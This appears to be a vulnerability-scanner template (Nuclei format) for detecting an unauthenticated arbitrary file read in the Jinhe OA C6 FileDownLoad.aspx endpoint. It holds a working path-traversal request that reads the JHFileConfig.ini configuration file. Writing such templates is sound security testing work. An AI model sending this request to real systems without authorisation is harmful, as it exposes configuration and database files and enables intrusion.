id: jinheOA-C6-FileDownLoad-File-reading

info:
  name: 金和OA C6 FileDownLoad.aspx 任意文件读取漏洞
  author: Superhero
  severity: medium
  description: 金和OA C6 FileDownLoad.aspx接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件(如数据库配置文件。系统配置文件)、数据库配置文件等等，导致网站处于极度不安全状态，
  tags: File reading
  
http:
  - raw:
      - |
        GET /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '[JHFile]'
      - type: status
        status: 
          - 200





